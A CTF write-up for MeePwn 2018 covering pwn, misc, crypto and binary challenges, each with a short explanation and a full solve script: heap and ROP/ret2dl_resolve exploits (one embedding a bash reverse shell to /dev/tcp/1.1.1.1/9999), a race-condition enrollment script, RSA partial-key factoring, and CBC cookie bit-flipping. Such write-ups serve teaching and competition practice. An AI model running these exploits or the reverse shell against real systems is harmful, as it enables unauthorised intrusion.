MeePwn CTF 2018 Writeup
======

## Pwn
### House of Card
There is a bug when editing a note, you can overwrite more than 0x44 byte on heap after realloc, then build fake heap struct and do whatever you want.   


```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level="debug"
pwn_file="./house_of_card"
os.environ["LD_LIBRARY_PATH"]="./"
elf=ELF(pwn_file)
libc=elf.libc
heap_address=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.128.87.12",31336)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("heap address:0x%x"%heap_address)
    pause()

def add(name,length,desc):
    conn.sendlineafter("Quit\n","1")
    conn.sendlineafter("Name :",name)
    conn.sendlineafter("Len?",str(length))
    if len(desc) == length:
        conn.sendafter("Description:\n",desc)
    else:
        conn.sendlineafter("Description:\n",desc)

def show_all():
    pool=[]
    while True:
        l=conn.recvline()
        print l
        d={}
        if "Back" in l:
            break
        idx=l.find("Name :")+6
        d["name"]=l[idx:-1]
        conn.recvuntil("Description :\n")
        temp=conn.recvuntil("\n\n")[:-2]
        if temp[:2]=="\t\t":
            temp=temp[2:]
        d["desc"]=temp
        pool.append(d)
    return pool

def edit(idx,name,length,desc,line=True):
    conn.sendlineafter("Quit\n","2")
    data=show_all()
    conn.sendlineafter(">",str(idx))
    conn.sendlineafter("New name?",name)
    conn.sendlineafter("Len?",str(length))
    if line:
        conn.sendline(desc)
    else:
        conn.send(desc)
    return data

def dele(idx):
    conn.sendlineafter("Quit\n","3")
    data=show_all()
    conn.sendlineafter(">",str(idx))
    return  data

add("1",0x3e0,"a"*0x3e0)
add("1",0x80,"a"*8)
data=edit(1,"1",0x300,"a")
#libc.address=u64(data[1]["desc"][8:16])-0x3c4b00
libc.address=u64(data[1]["desc"][8:16])-0x3c1b00
add("1",0x100,"a")
add("1",0x100,"a")
add("1",0x100,"a")
add("1",0x100,"a")
dele(4)
dele(4)
add("1",0xe0,"a"*8)
data=dele(3)
heap_address=u64(data[-1]["desc"][8:16])-0x800
dele(1)
dele(1)
dele(1)
dele(1)
add("a",0x410,"a"*0x410)
add("a",0x400,"a"*0x400)
f={
    0x40c:p64(0xdeadbeef)+p64(0x411)+p64(0)+p64(libc.sym["_dl_open_hook"]-0x10)+p64(0)+p64(libc.sym["_dl_open_hook"]-0x20)
}
edit(1,"1",0x411,fit(f,filler="\x00"))
add("a",0x410,"a"*0x410)
edit(2,"1",0x404,"a"*0x3fc+p64(libc.address+0xf24cb))
dele(2)
conn.interactive()
```

### one_shot
I use 0x400695 gadget to copy input data to bss, and build a fake link map to call system using dl_resolve.   
reference:[https://www.slideshare.net/AngelBoy1/re2dlresolve#38](https://www.slideshare.net/AngelBoy1/re2dlresolve#38)  

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
def build_link_map_x64(elf,libc,link_map_addr,dst_f,src_f="__libc_start_main",dst_add_got=None):
    """
    dst_f: libc function or libc offset
    src_f: str:a elf got table resolved && byte(elf.got[src_f]-8) & 3 != 0
    dst_add_got: funtion fake got, it will store dst_f in libc after resolved,
    """
    if dst_add_got==None:
        dst_add_got=link_map_addr+8
    if type(dst_f) == str:
        dst_add=libc.sym[dst_f]
    else:
        dst_add=dst_f

    offset=(dst_add-libc.sym[src_f])%2**64
    f={
        0:offset,
        0x68:link_map_addr+0x60,
        0x70:link_map_addr+0x70,
        0x78:elf.got[src_f]-8,
        0x80:link_map_addr+0x88,
        0x88:(dst_add_got-offset)%2**64,
        0x90:7,
        0xf8:link_map_addr+0x80-8,
    }
    return f    


context.log_level="debug"
context.arch="amd64"
os.environ["LD_LIBRARY_PATH"]="./"
pwn_file="./one_shot"
elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.128.87.12",31338)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

link_map_add=0x601a00
link_map_f=build_link_map_x64(elf,libc,link_map_add,"system","close")
link_map=fit(link_map_f,filler="a").replace("a","")

cmd="bash -c \"bash -i >& /dev/tcp/1.1.1.1/9999 0>&1\""
cmd_addr=link_map_add+0x98
link_map_rop=[
    p64(0x4006FB)+p64(link_map_add+0x68+0x1c)+p64(0x400673)+p64(0x1)+p64(link_map_add+0x68+0x20)+p64(0x40067A),# write 0x68-0x98
    p64(0)+p64(link_map_add+0xf8+0x20)+p64(0x400673),# write 0xf8
    p64(0)+p64(link_map_add+4+0x20)+p64(0x400673),# adjust rdi offset
    p64(0)+p64(link_map_add+0x20)+p64(0x400673)+p64(0)*2,# write 0x0
    # control rdi
    p64(0x40083A)+p64(0)+p64(1)+p64(elf.got["close"])+p64(0)+p64(0)+p64(cmd_addr)+p64(0x400820)+"a"*56,
    p64(0x400506)+p64(link_map_add)+p64(0),# dl resolve
]
f={
    0:p32(0x8A919FF0),
    0x4:[p32(0x30+len(cmd))+p64(link_map_f[0x68])+p64(link_map_f[0x70])+p64(link_map_f[0x78])+p64(link_map_f[0x80])+p64(link_map_f[0x88])+p64(link_map_f[0x90])+cmd,
        p32(link_map_f[0xf8])+p32(0xffffffff)+p64(link_map_f[0])[:4],
        ],
    # set rbp
    0x88:link_map_rop
}
payload=fit(f,filler="\x00")
conn.send(payload)

```
## Misc
### 0xBAD MINTON
this is a web+pwn challenge, backend server is very easy to find. In the backend server, there are some code for checking  whether the times you choose course is less than 100, wired, right? because you can only choose 3 courses at most using web brower, so I using a multi-thread script to choose course at the same time, then I choose 4 courses! In this way, stackoverflow works now, overwrite argv[0] to the flag pointer, program will output flag when crash.  

```python
import requests
import json
from multiprocessing import Pool
import random
name="".join(map(chr,[random.randint(0,25)+ord('a') for _ in range(5)]))

def run():
	s=requests.Session()
	data={"username":name,"password":"12345"}
	p=s.get("http://178.128.84.72/login.php?",params=data)
	print name
	s.get("http://178.128.84.72/login.php?action=enroll")
	s.get("http://178.128.84.72/login.php?action=enroll")

pool=Pool()
pool.apply_async(run)
pool.apply_async(run)
pool.close()
pool.join()
```

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./backend_server"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.128.84.72",9997)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

conn.sendafter("Token> ","0ce1bf6c7a23d0c0dfe80c0cc3bb06c85e0e97e90fbe63a973df5e590fc0321e\x00")

for i in range(3):
    conn.sendafter("What is the course name?>","a"*0x400)

f={
    0xf8:p64(0x604070),
}
conn.sendafter("?>",fit(f,filler="\x00"))
conn.sendlineafter("> ","3")
conn.interactive()
```

## Crypto
### bitbitbit

During the generation of `n`, the middle part of `p` and `q` is idntical and the delta of most lower part can be estimated. So we can recover more than half of lower bits of `p` and `q` and use coppersmith method to factor the number `n`.

The solve script is below, while the `partial_p.sage` file is from <http://inaz2.hatenablog.com/entry/2016/01/20/022936>

```
from pwn import *

d = 676
gg = -5388671474894174933667906932008585932508768479103975
t1 = (1024-d)/2
t2 = (1024+d)/2
n = 21127569014815582409945206855235883642320354838430553758832417307619287106016805131826297401912745213069767676453560941618792152752914130235531992711318050295821223030890500747920485549756995595143420967973191842457810417284961508049223662716518359828176601213202498449782242487619344806606431183806437181405714199618989149768780996568810441265598398266628126330342528035642321920699447032335669131910605441690962279320688681810941850161727721382283833389486313202712844654266136348231359396517208120180150403996431654454796804727172003317549678845666574813712311135094842934225780568196485745239980791834850589806489

def testp(p0):
    c = process('./partial_p_lower.sage')
    c.sendline(str(n))
    c.sendline(str(t2))
    c.sendline(str(p0))
    c.recvuntil('ans\n')
    ans = int(c.recvline().strip())
    c.close()
    print ans
    if ans!=-1 and n%ans==0:
        print '----------------------'
        print ans
        print '----------------------'
        return True
    else:
        return False


def calc(q,mask):
    p=(q+g)&mask
    return (p*q)&mask

def searchq(q,i):
    if i>=t2:
        #print 'find', q
        if testp(q):
            exit()
        return
    mask = (1<<(i+1))-1
    res = 0
    nmask = n&mask
    if calc(q,mask)==nmask:
        searchq(q,i+1)
    if calc(q+(1<<i),mask)==nmask:
        searchq(q+(1<<i),i+1)

for i in range(-1000,1000):
    print i
    g = gg+i
    searchq(0,0)
print t2
```

### silly note

This challenge provide a website and after several attempts we can find the cookie is encrypted with CBC mode, and the plaintext json is something like  
```
{"note": "aaaaaa
aaaaaaaaaaaaaaaa
aa", "level": 1,
  name": "123"X}
```

If we make note long enough to cover a whole block, we can change one byte in ciphertext of that block, in order to control another byte at next block. Since the content of modified block is inside `note` field most value would be ok for json format.

And change `level` field to 0 gives us flag. Don't know why. Just guess and try.

The final solve script is below.

```
import requests
import string
import os


def cons(ct):
    return ''.join(map(chr,ct)).encode('base64').replace('\n','')

def enconce(dat):
    cmd = "curl -v 'https://silly-note.herokuapp.com/save-my-note' -H 'Cookie: state=\"RRmq8wg/rpSSehjuA/eq1+lBQ5zi54pHtKwA1ckUw2R389u/K7oaX5wdlx0EwuZFSf3TpLtDmRuuBW1ZDEHtmA==\"' --data 'note=%s' 2>wtf" % dat
    os.system(cmd)
    f = open('wtf')
    s=f.read()
    p1 = s.find('Set-Cookie:')
    p2 = s.find('\n', p1)
    coo = s[p1+18:p2].strip()
    if coo[0]=='"' and coo[-1]=='"':
        coo = coo[1:-1]
    return coo


def once(ct,debug=False):
    cookie ={}
    cookie['state'] = ''.join(map(chr,ct)).encode('base64').replace('\n','')

    r = requests.get('https://silly-note.herokuapp.com/', cookies = cookie)
    assert r.status_code==200
    if debug:
        print r.text
    if "Can't decode JSON object" != r.text:
        return True
    else:
        return False
def dec(x):
    return map(ord,x.decode('base64'))

ct = map(ord,"N/Cf8BKpPZDPQ+1oDcK58R0A+aLOpc5whX1x3wBNPfbXLgtRcq1udILj1uOeY6rYXoZRbOWOpPXk0F9J8fcSNg==".decode('base64'))
ct = dec('e6g/3Bao77p5sXShumm6xqbL1MAwdrAnUyd0gIY4Jy0Xvf9WnEAhgoDkxJjO79+7NKFYmdYUN5bC0d6jgJx+pw==')
#ct = dec('e6g/3Bao77p5sXShumm6xqbL1MAwdrAnUyd0gIY4Jy2wrdL8Ba9nWGy/Ak3boaL/Y0wW3hznjgNOTRh9IDEHAYdWsmgXZW9VzU4Dl7uTt2Q=')
#ct = dec('e6g/3Bao77p5sXShumm6xib0AbX7l/sVTzM8p6rNp/0feJWFpCDFcPsoy70AwtArPSy9wgno71Bd9bUxT7uW4Yawqu0tuUQnsYeo17reMuw=')
#ct = dec('e6g/3Bao77p5sXShumm6xqbL1MAwdrAnUyd0gIY4Jy2wrdL8Ba9nWGy/Ak3boaL/TwdNFexqQaB9jI2ZBChNqA==')
'''
ct =dec(enconce('12345'))
print ct
for ch in string.printable:
    print ord(ch)
    ct2=dec(enconce('12345'+ch))
    if ct2[:16] == ct[:16]:
        print 'find',ord(ch)
    
'''
print len(ct)
ct[30]^=1
print once(ct,True)
exit()
for i in range(222,256):
    ct[62]=i
    print i
    if once(ct):
        print 'find',i
```

## Binary
### XSS

This binary will start another two replica of itself and these three guys will inject code into each other's memory. It also contains some junk code to distrub the analysis of IDA.

For me I just dump the injected code manually and after several levels of injection, we can see `aesenc aesenclast` assembly instruction distributed in those functions. I tryed standard AES key expansion but the result seems different from the round key given. I'm lazy so I just bruteforce every permutation to decrypt and filter the flag.

The key part of final script is below
```
from itertools import permutations

ct=map(ord,'h\xce\xdf\xddXl7\xe4\xc4\xe1\xac\xb4\t\x7f\x97\xa4')
kf2=map(ord,'j\x15m\x0b\x9d\xf0\xc24t\x8a\xd4OP\x84\xa0\x7f')
ksraw=['`\x9dG1\xb5\xdd6~\xef\x99z\xd8I\\E#', '\xfa\xec\xdb\xbb\x93\xb2:\xefh\xe4\xbem/\xf6kL', 'E3~<\xf0\x7f-\xac3D;uH*\xc5F', 'M\xf0\xec\x1a=\x04\xa9\xdb\xf5\xd5\x08\x1a\x80p\x93\x06', '>C\x95<i\xd0sg"\x97\xd1\xb1\xa3a\xfdJ', '.\xeb\xcfF\x05\xae=\x94\xba\x8c\xcc\xf4L\xa1\x1dL', '\xba\xf0\xab\x1f\xac/X\x81\xf1%\xb1Y\xf9y\xde\x03', '4\xaf\xffWQ:\x0f\xec\x8b\xa0\xe6_\x8c\x98`x', 't\xf9\xc5B\x7fzn\xe2\xb1\x1f,\xc2\x18\x04\xb8\xf7', '\n\x98c\x1d\x84i\x82\x08\x07\xca1\xf7\x1d3V)']

for per in permutations(range(9)):
    ks=[]
    for oo in per:
        ks.append(map(ord,ksraw[oo]))
    ks.append(map(ord,ksraw[9]))
    ans = decryptrounds(ct, ks, kf2)
    ok=True
    for ch in ans:
        if ch>0x80:
            ok=False
    if ok:
        print ans
```
